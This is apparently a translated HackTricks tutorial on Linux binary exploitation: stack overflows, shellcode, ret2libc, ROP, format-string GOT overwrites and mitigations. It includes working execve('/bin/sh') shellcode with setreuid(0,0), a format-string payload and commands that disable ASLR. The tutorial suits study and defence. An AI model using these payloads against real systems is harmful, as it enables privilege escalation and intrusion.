# Linux Exploiting (基础) (SPA)

## Linux Exploiting (基础) (SPA)

<details>

<summary><strong>从零开始学习AWS黑客攻击直到成为专家，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在 **HackTricks中看到您的公司广告** 或 **下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取 [**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现 [**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上 **关注** 我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。**

</details>

## **ASLR**

地址随机化

**全局禁用地址随机化(ASLR) (需要root权限)**:\
echo 0 > /proc/sys/kernel/randomize\_va\_space\
重新启用全局地址随机化: echo 2 > /proc/sys/kernel/randomize\_va\_space

**为单次执行禁用地址随机化** (不需要root权限):\
setarch \`arch\` -R ./ejemplo argumentos\
setarch \`uname -m\` -R ./ejemplo argumentos

**禁用栈执行保护**\
gcc -fno-stack-protector -D\_FORTIFY\_SOURCE=0 -z norelro -z execstack ejemplo.c -o ejemplo

**核心文件**\
ulimit -c unlimited\
gdb /exec core\_file\
/etc/security/limits.conf -> \* soft core unlimited

**文本**\
**数据**\
**BSS**\
**堆**

**栈**

**BSS段**: 未初始化的全局或静态变量
```
static int i;
```
**数据段**: 已初始化的全局或静态变量
```
int i = 5;
```
**Sección TEXT**: 指令代码（opcodes）

**Sección HEAP**: 动态分配的缓冲区（malloc(), calloc(), realloc()）

**Sección STACK**: 栈（传递的参数，环境字符串（env），局部变量...）

## **1.STACK OVERFLOWS**

> buffer overflow, buffer overrun, stack overrun, stack smashing

段错误或段违规：尝试访问未分配给进程的内存地址时发生。

要获取程序中函数的地址，可以执行：
```
objdump -d ./PROGRAMA | grep FUNCION
```
## ROP

### 调用 sys\_execve

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

## **2. SHELLCODE**

查看内核中断：cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep “\_\_NR\_”

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(“/bin/sh”, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; 清空 eax\
xor ebx, ebx ; ebx = 0 因为没有参数传递\
mov al, 0x01 ; eax = 1 —> \_\_NR\_exit 1\
int 0x80 ; 执行 syscall

**nasm -f elf assembly.asm** —> 返回一个 .o 文件\
**ld assembly.o -o shellcodeout** —> 生成由汇编代码组成的可执行文件，并可以使用 **objdump** 提取 opcodes\
**objdump -d -Mintel ./shellcodeout** —> 确认它确实是我们的 shellcode 并提取 OpCodes

**验证 shellcode 是否有效**
```
char shellcode[] = “\x31\xc0\x31\xdb\xb0\x01\xcd\x80”

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">​</span>
```
为了验证系统调用是否正确执行，应该编译上述程序，并且系统调用应该出现在 **strace ./PROGRAMA\_COMPILADO**

在创建shellcodes时，可以使用一个技巧。第一条指令是跳转到一个call。这个call调用原始代码，并且将EIP压入栈中。在call指令之后，我们插入了所需的字符串，因此利用这个EIP我们可以指向该字符串，并且继续执行代码。

例如 **技巧 (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al último call
popl                %esi                                       ; Guardamos en ese la dirección al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=“/bin/sh”
leal                 0x8(%esi), %ecx      ; arg[2] = {“/bin/sh”, “0”}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(“/bin/sh”, [“/bin/sh”, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instrución
.string             \”/bin/sh\”                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">​</span>
```
**使用栈(/bin/sh)的EJ：**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; “\0”
push               dword 0x68732f2f ; “//sh”
push               dword 0x6e69622f; “/bin”
mov                ebx, esp                     ; arg1 = “/bin//sh\0”
push               eax                             ; Null -> args[1]
push               ebx                             ; “/bin/sh\0” -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(“/bin/sh”, args[“/bin/sh”, “NULL”], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecutó fabs
…
```
**Egg Hunter：**

它是一个小型代码，用于遍历与进程关联的内存页面，寻找存储在那里的shellcode（搜索shellcode中的某个签名）。在只有很小空间可用于注入代码的情况下非常有用。

**多态Shellcodes**

它们是加密的shell，包含一个小型代码用于解密并跳转到该shell，使用Call-Pop技巧，这是一个**凯撒加密示例**：
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrerá)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aquí va el shellcode
```
1. **攻击帧指针（EBP）**

在我们可以修改EBP但不能修改EIP的情况下很有用。

众所周知，在函数退出时会执行以下汇编代码：
```
movl               %ebp, %esp
popl                %ebp
ret
```
```markdown
因此，如果在一个函数（fvuln）退出时可以修改EBP，并且该函数是由另一个函数调用的，那么当调用fvuln的函数结束时，它的EIP可以被修改。

在fvuln中，可以引入一个假的EBP，指向shellcode地址+4的位置（需要加上4是因为pop操作）。这样，当函数退出时，ESP的值会变成&(\&Shellcode)+4，pop操作会使ESP减去4，这样当执行ret指令时，ESP将指向shellcode的地址。

**Exploit：**\
\&Shellcode + "AAAA" + SHELLCODE + 填充 + &(\&Shellcode)+4

**Off-by-One Exploit**\
只允许修改EBP的最低有效字节。可以执行类似上述攻击，但存储shellcode地址的内存必须与EBP的前三个字节相同。

## **4. 返回到Libc的方法**

当栈不可执行或只留下很小的缓冲区供修改时，此方法很有用。

ASLR导致每次执行时函数在内存中的位置不同。因此，在这种情况下，这种方法可能不有效。对于远程服务器，由于程序在同一地址上不断执行，这种方法可能有用。

* **cdecl(C声明)** 将参数放入栈中，并在函数退出后清理栈
* **stdcall(标准调用)** 将参数放入栈中，由被调用的函数清理栈
* **fastcall** 将前两个参数放入寄存器，其余的放入栈中

将libc中的system指令地址放入，并将字符串“/bin/sh”作为参数传递，通常是通过环境变量。此外，使用exit函数的地址，以便一旦不再需要shell，程序可以退出而不会出现问题（并写入日志）。

**export SHELL=/bin/sh**

为了找到我们需要的地址，可以在**GDB**中查看：\
**p system**\
**p exit**\
**rabin2 -i 可执行文件** —> 提供程序加载时使用的所有函数的地址\
（在start或某个断点内）：**x/500s $esp** —> 在这里搜索字符串/bin/sh

一旦我们有了这些地址，**exploit**将是：

“A” \* EBP到达的距离 + 4 (EBP：可以是4个"A"，尽管使用真实的EBP更好，以避免段错误) + **system**的地址（将覆盖EIP）+ **exit**的地址（在执行system("/bin/sh")后将调用此函数，因为栈的前4个字节被视为下一个要执行的EIP地址）+ “**/bin/sh**”的地址（将作为参数传递给system）

这样，EIP将被覆盖为system的地址，该地址将接收字符串“/bin/sh”作为参数，并在退出后执行exit()函数。

可能会遇到某些函数地址中的某个字节是空字节或空格(\x20)的情况。在这种情况下，可以反汇编该函数之前的地址，因为可能有多个NOP，这允许我们调用其中的一个而不是直接调用函数（例如使用 > x/8i system-4）。

这种方法有效，因为使用opcode **ret** 而不是 **call** 来调用像system这样的函数时，函数会认为前4个字节将是返回的**EIP**地址。

使用这种方法的一个有趣技巧是调用**strncpy()**将payload从栈移动到堆，然后使用**gets()**执行该payload。

另一个有趣的技巧是使用**mprotect()**，它允许为内存的任何部分分配所需的权限。这在BDS、MacOS和OpenBSD上有效或曾经有效，但在linux上不行（它控制不能同时授予写入和执行权限）。通过这种攻击，可以重新将栈配置为可执行的。

**函数链**

基于前面的技术，这种exploit方法包括：\
填充 + \&函数1 + \&pop;ret; + \&arg\_fun1 + \&函数2 + \&pop;ret; + \&arg\_fun2 + …

这样可以链式调用多个函数。此外，如果要使用带有多个参数的函数，可以放置所需的参数（例如4个），然后放置4个参数并寻找带有opcodes的地址：pop, pop, pop, pop, ret —> **objdump -d 可执行文件**

**通过伪造帧的链（EBP链）**

利用可以操作EBP的能力，通过EBP和"leave;ret"来链式执行多个函数。

填充

* 将EBP设置为一个假的EBP，它指向：第二个假EBP + 要执行的函数：(\&system() + \&leave;ret + &“/bin/sh”)
* 在EIP中放置一个函数的地址 &(leave;ret)

用指向shellcode下一部分的地址开始shellcode，例如：第二个假EBP + \&system() + &(leave;ret;) + &“/bin/sh”

第二个EBP将是：第三个假EBP + \&system() + &(leave;ret;) + &“/bin/ls”

这个shellcode可以在可以访问的内存部分无限重复，从而获得一个可以轻松分割成小内存块的shellcode。

（通过混合之前看到的EBP和ret2lib漏洞来链式执行函数）

## **5.补充方法**

**Ret2Ret**

当无法将栈地址放入EIP（检查EIP不包含0xbf）或无法计算shellcode的位置时，此方法很有用。但是，易受攻击的函数接受一个参数（shellcode将放在这里）。

这样，通过将EIP更改为**ret**的地址，将加载下一个地址（即函数的第一个参数的地址）。也就是说，将加载shellcode。

exploit将是：SHELLCODE + 填充（直到EIP）+ **\&ret**（栈的下一个字节指向shellcode的开始，因为参数地址被放入栈中）

看来像**strncpy**这样的函数一旦完成就会从栈中删除shellcode的地址，使得这种技术无法使用。也就是说，传递给函数作为参数的地址（存储shellcode的地址）被修改为0x00，因此在调用第二个**ret**时会遇到0x00，程序崩溃。
```
```
**Ret2PopRet**
```
如果我们不能控制第一个参数，但可以控制第二个或第三个参数，我们可以通过覆盖EIP并使用pop-ret或pop-pop-ret地址来实现，具体取决于我们需要哪一个。

**Murat技术**

在Linux中，所有程序都映射在0xbfffffff开始的地址。

通过观察Linux中新进程的堆栈是如何构建的，可以开发出exploit，使程序在只有shellcode这一个变量的环境中启动。这个地址可以计算为：addr = 0xbfffffff - 4 - strlen(NOMBRE\_ejecutable\_completo) - strlen(shellcode)

这样就可以简单地获得带有shellcode的环境变量的地址。

这可以通过execle函数实现，它允许创建一个只包含所需环境变量的环境。

**跳转到ESP：Windows风格**

由于ESP始终指向堆栈的开始，这种技术涉及将EIP替换为**jmp esp**或**call esp**的地址。这样，在覆盖EIP之后，shellcode会被保存，因为执行**ret**后，ESP将指向下一个地址，正好是保存shellcode的位置。

如果Windows或Linux没有启用ASLR，可以调用存储在某个共享对象中的**jmp esp**或**call esp**。如果启用了ASLR，可以在易受攻击的程序内部进行搜索。

此外，能够在EIP损坏后而不是在堆栈中间放置shellcode，意味着在函数中执行的push或pop指令不会接触到shellcode（如果放在函数堆栈中间可能会发生这种情况）。

非常类似地，如果我们知道一个函数返回保存shellcode的地址，我们可以调用**call eax**或**jmp eax (ret2eax)**。

**ROP（Return Oriented Programming）或借用代码块**

被调用的代码片段被称为gadgets。

这种技术涉及通过**ret2libc**技术和使用**pop,ret**来链接不同的函数调用。

在某些处理器架构中，每条指令是一个32位的集合（例如MIPS）。然而，在Intel中，指令的大小是可变的，多个指令可以共享一组位，例如：

**movl $0xe4ff, -0x(%ebp)** —> 包含字节0xffe4，这也可以翻译为：**jmp \*%esp**

这样，一些原本甚至不在原始程序中的指令也可以被执行。

**ROPgadget.py**帮助我们在二进制文件中找到值

这个程序也用于创建**payloads**。你可以给它一个你想要提取ROPs的库，它会生成一个python payload，你只需提供该库的地址，payload就准备好可以作为shellcode使用了。此外，由于它使用系统调用，并不真正在堆栈上执行任何操作，而只是保存将通过**ret**执行的ROPs的地址。要使用这个payload，需要通过**ret**指令调用payload。

**整数溢出**

当一个变量无法支持传递给它的大数时，就会发生这种类型的溢出，可能是由于有符号和无符号变量之间的混淆，例如：
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
在上一个例子中，我们看到程序期望有两个参数。第一个是下一个字符串的长度，第二个是字符串本身。

如果我们传递一个负数作为第一个参数，将会出现 len < 256 的情况，我们就可以通过这个过滤器，而且 strlen(buffer) 也会小于 l，因为 l 是 unsigned int，它会非常大。

这种类型的溢出并不是为了在程序的进程中写入某些东西，而是为了绕过设计不良的过滤器来利用其他漏洞。

**未初始化的变量**

未初始化的变量的值是未知的，观察它可能会很有趣。它可能会取之前函数中某个变量的值，而这个变量可能被攻击者控制。

## **格式化字符串**

在 C 语言中，**`printf`** 是一个用来**打印**字符串的函数。这个函数期望的**第一个参数**是**带有格式化符的原始文本**。期望的**后续参数**是用来**替换**原始文本中的**格式化符**的**值**。

当攻击者的文本被放置为这个函数的第一个参数时，就会出现漏洞。攻击者将能够构造一个**特殊输入，滥用** **printf 格式**字符串的功能，以**在任何地址写入任何数据**。这样就能够**执行任意代码**。

格式化符：
```bash
%08x —> 8 hex bytes
%d —> Entire
%u —> Unsigned
%s —> String
%n —> Number of written bytes
%hn —> Occupies 2 bytes instead of 4
<n>$X —> Direct access, Example: ("%3$d", var1, var2, var3) —> Access to var3
```
**`%n`** **写入** 已写入**字节数**到**指定地址**。通过写入与我们需要写入的十六进制数一样多的**字节**，就可以**写入任何数据**。
```bash
AAAA%.6000d%4\$n —> Write 6004 in the address indicated by the 4º param
AAAA.%500\$08x —> Param at offset 500
```
### GOT (全局偏移表) / PLT (程序链接表)

这是一个表，包含了程序使用的**外部函数**的**地址**。

使用以下命令获取这个表的地址：**`objdump -s -j .got ./exec`**

![](<../../.gitbook/assets/image (619).png>)

注意，在GEF中**加载**了**可执行文件**后，你可以**看到**GOT中的**函数**：`gef➤ x/20x 0xDIR_GOT`

![](<../../.gitbook/assets/image (620) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (5).png>)

使用GEF，你可以**开始**一个**调试**会话，并执行**`got`**来查看got表：

![](<../../.gitbook/assets/image (621).png>)

在一个二进制文件中，GOT包含了函数的**地址**或者是将会加载函数地址的**PLT**部分的地址。这种利用的目标是**覆盖**稍后将要执行的函数的GOT条目**与**PLT中的**`system`** **函数**的**地址**。理想情况下，你会**覆盖**一个**函数**的**GOT**，这个函数**将会被调用，并且参数由你控制**（这样你就能控制发送给system函数的参数）。

如果脚本**没有使用**`system`，system函数**不会**在GOT中有一个条目。在这种情况下，你将**需要首先泄露**`system`函数的地址。

**程序链接表**是ELF文件中的一个**只读**表，存储了所有需要解析的**符号**。当这些函数中的一个被调用时，**GOT**会**重定向**流程到**PLT**，以便它可以**解析**函数的**地址**并将其写入GOT。
然后，**下一次**调用该地址时，**函数**会被**直接调用**，无需再次解析。

你可以使用**`objdump -j .plt -d ./vuln_binary`**来查看PLT地址。

### **利用流程**

如前所述，目标将是**覆写**稍后将要调用的**GOT**表中某个**函数**的**地址**。理想情况下，我们可以将**地址设置为位于可执行部分的shellcode**，但很可能你无法在可执行部分写入shellcode。
因此，另一个选项是**覆写**一个**接收**其**参数**来自**用户**的**函数**，并将其**指向**`system`**函数**。

通常写入地址需要两个步骤：你**首先写入地址的2个字节**，然后是另外2个。为此使用**`$hn`**。

**HOB**指的是地址的高2个字节\
**LOB**指的是地址的低2个字节

因此，由于格式化字符串的工作方式，你需要**首先写入**\[HOB, LOB]中**较小的一个**，然后是另一个。

如果 HOB < LOB\
`[address+2][address]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

如果 HOB > LOB\
`[address+2][address]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB\_shellcode-8 NºParam\_dir\_HOB LOB\_shell-HOB\_shell NºParam\_dir\_LOB

\`python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'\`

### **格式化字符串利用模板**

你可以在这里找到一个利用GOT使用格式化字符串的**模板**：

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}

### **.fini\_array**

本质上这是一个结构，包含了程序结束前将要被调用的**函数**。如果你可以通过跳转到一个地址来调用你的**shellcode**，或者在需要再次回到main来**第二次利用格式化字符串**的情况下，这会很有趣。
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
请注意，这**不会**创建一个**永恒循环**，因为当你返回到main函数时，canary会注意到，栈的末端可能已经被破坏，函数不会再次被调用。所以通过这种方式，你将能够**再执行一次**漏洞。

### **格式化字符串来转储内容**

格式化字符串也可以被滥用来**转储**程序内存中的内容。\
例如，在以下情况中，栈中有一个**局部变量指向一个标志(flag)**。如果你**找到**在**内存**中指向**标志**的**指针**的位置，你可以让**printf访问**那个**地址**并**打印**出**标志**：

所以，标志位于 **0xffffcf4c**

![](<../../.gitbook/assets/image (618) (2).png>)

从泄露中你可以看到**指向标志的指针**位于**第8个**参数：

![](<../../.gitbook/assets/image (623).png>)

因此，**访问第8个参数**你可以获取标志：

![](<../../.gitbook/assets/image (624).png>)

请注意，遵循**之前的利用**并意识到你可以**泄露内容**，你可以**设置指针**指向**`printf`**，到**可执行文件**被**加载**的区域，并**完全转储**它！

### **DTOR**

{% hint style="danger" %}
如今，找到一个带有dtor段的二进制文件是非常**罕见的**。
{% endhint %}

析构函数是在**程序结束前执行**的函数。\
如果你设法**写入**一个指向**shellcode**的**地址**到**`__DTOR_END__`**，那么在程序结束前它将被**执行**。\
使用以下命令获取这个段的地址：
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep “__DTOR”
```
通常你会发现 **DTOR** 部分位于 `ffffffff` 和 `00000000` 之间。所以如果你只看到这些值，意味着没有任何函数被注册。因此，用指向 **shellcode** 的 **地址** **覆盖** **`00000000`** 来执行它。

### **格式化字符串到缓冲区溢出**

**sprintf** 将格式化的字符串移动到一个 **变量** 中。因此，你可以滥用字符串的 **格式化** 来引起变量中的 **缓冲区溢出**。\
例如，有效载荷 `%.44xAAAA` 将在变量中 **写入 44B+"AAAA"**，这可能会导致缓冲区溢出。

### **\_\_atexit 结构**

{% hint style="danger" %}
现在利用这个非常 **罕见**。
{% endhint %}

**`atexit()`** 是一个函数，其他函数作为参数传递给它。这些 **函数** 将在执行 **`exit()`** 或 **main** 的 **返回** 时被 **执行**。\
如果你能 **修改** 这些 **函数** 的 **地址** 指向一个 shellcode，例如，你将 **控制** 该 **进程**，但这目前更复杂。\
目前要执行的 **函数地址** 被隐藏在几个结构后面，最终指向的地址不是函数的地址，而是通过 **随机密钥** 进行 **XOR 加密** 和位移。所以目前这个攻击向量在 **x86** 和 **x64\_86** 上 **不是很有用**。\
**加密函数** 是 **`PTR_MANGLE`**。**其他架构** 如 m68k, mips32, mips64, aarch64, arm, hppa... **没有实现加密** 函数，因为它 **返回的和输入的相同**。所以这些架构可能会受到这种攻击。

### **setjmp() & longjmp()**

{% hint style="danger" %}
现在利用这个非常 **罕见**。
{% endhint %}

**`Setjmp()`** 允许 **保存** **上下文**（寄存器）\
**`longjmp()`** 允许 **恢复** **上下文**。\
被 **保存的寄存器** 包括：`EBX, ESI, EDI, ESP, EIP, EBP`\
问题是 EIP 和 ESP 通过 **`PTR_MANGLE`** 函数传递，所以 **易受此攻击的架构与上述相同**。\
它们对于错误恢复或中断很有用。\
然而，据我所读，其他寄存器没有受到保护，**所以如果函数内部有 `call ebx`, `call esi` 或 `call edi`**，就可以取得控制权。或者你也可以修改 EBP 来修改 ESP。

**VTable 和 VPTR 在 C++ 中**

每个类都有一个 **Vtable**，它是一个 **指向方法的指针数组**。

每个 **类** 的对象都有一个 **VPtr**，它是一个 **指向其类数组的指针**。VPtr 是每个对象头部的一部分，所以如果实现了 **VPtr** 的 **覆盖**，就可以 **修改** 它指向一个虚拟方法，这样执行一个函数就会转到 shellcode。

## **预防措施和规避**

**ASLR 不够随机**

PaX 将进程的地址空间分为3组：

已初始化和未初始化的代码和数据：.text, .data 和 .bss —> 16位的熵在 delta\_exec 变量中，这个变量在每个进程中随机启动并加到初始地址上

通过 mmap() 分配的内存和共享库 —> 16位，delta\_mmap

栈 —> 24位，delta\_stack —> 实际上是 11位（从第10个字节到第20个字节） —> 对齐到 16字节 —> 524,288 个可能的实际栈地址

环境变量和参数的移动比栈中的缓冲区小。

**Return-into-printf**

这是一种将缓冲区溢出转换为格式化字符串错误的技术。它通过替换 EIP 使其指向函数中的 printf，并传递一个被操纵的格式化字符串作为参数，以获取有关进程状态的值。

**攻击库**

库位于具有 16位随机性的位置 = 65636 个可能的地址。如果一个易受攻击的服务器调用 fork()，内存地址空间会被克隆到子进程中并保持不变。因此，可以尝试对 libc 中的 usleep() 函数进行暴力破解，传递参数 “16”，这样当它响应时间超过正常时，就找到了该函数。知道了该函数的位置，就可以获得 delta\_mmap 并计算其他的。

确保 ASLR 工作的唯一方法是使用 64位架构。在那里没有暴力破解攻击。

**StackGuard 和 StackShield**

**StackGuard** 在 EIP 之前插入 —> 0x000aff0d(null, \n, EndOfFile(EOF), \r) —> 仍然容易受到 recv(), memcpy(), read(), bcoy() 的攻击，且不保护 EBP

**StackShield** 比 StackGuard 更复杂

它在一个表（Global Return Stack）中保存所有返回地址的 EIP，这样溢出就不会造成任何伤害。此外，可以比较两个地址，看是否发生了溢出。

还可以通过一个极限值检查返回地址，这样如果 EIP 去了一个不寻常的地方，比如数据空间，就会知道。但这可以通过 Ret-to-lib, ROPs 或 ret2ret 来绕过。

如你所见，stackshield 也不保护局部变量。

**Stack Smash Protector (ProPolice) -fstack-protector**

在 EBP 之前放置 canary。重新排列局部变量，使缓冲区位于最高位置，这样就不能覆盖其他变量。

此外，它会在栈上方（局部变量上方）安全地复制传递的参数，并使用这些副本作为参数。

它不能保护少于 8 个元素的数组，也不能保护用户结构中的缓冲区。

canary 是从 “/dev/urandom” 中获取的随机数，否则是 0xff0a0000。它存储在 TLS（Thread Local Storage）中。线程共享相同的内存空间，TLS 是一个区域，它有每个线程的全局或静态变量。然而，这些通常是从父进程复制的，尽管子进程可以修改这些数据，而不会修改父进程或其他子进程的数据。问题是，如果使用 fork() 但没有创建新的 canary，那么所有进程（父进程和子进程）都会使用相同的 canary。在 i386 中存储在 gs:0x14，在 x86\_64 中存储在 fs:0x28

这种保护定位到可能被攻击的带有缓冲区的函数，并在函数开始时包含代码放置 canary，在最后检查它。

fork() 函数会完全复制父进程的进程，因此如果一个 web 服务器调用 fork()，可以进行逐字节的暴力破解，直到找出正在使用的 canary。

如果在 fork() 之后使用 execve() 函数，它会覆盖空间，攻击就不可能了。vfork() 允许在不创建副本的情况下执行子进程，直到子进程尝试写入，然后才创建副本。

**Relocation Read-Only (RELRO)**

### Relro

**Relro (只读重定位)** 影响内存权限，类似于 NX。区别在于 NX 使栈可执行，而 RELRO 使 **某些东西只读**，所以我们 **不能写入** 它们。我见过的最常见的障碍是防止我们进行 **`got` 表覆盖**，这将在后面介绍。`got` 表保存 libc 函数的地址，以便二进制文件知道这些地址并可以调用它们。让我们看看带有和不带 relro 的二进制文件的 `got` 表项的内存权限是什么样的。

带有 relro：
```bash
gef➤  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /tmp/tryc
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /tmp/tryc
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /tmp/tryc
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /tmp/tryc
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /tmp/tryc
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef➤  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef➤  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/tryc'(0x555555557000-0x555555558000), permission=r--
0x555555557fd0 - 0x555555557fe8  →   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Without relro:
未启用 relro：
```bash
gef➤  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /tmp/try
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /tmp/try
0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /tmp/try
0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /tmp/try
0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /tmp/try
0x0000000000405000 0x0000000000426000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
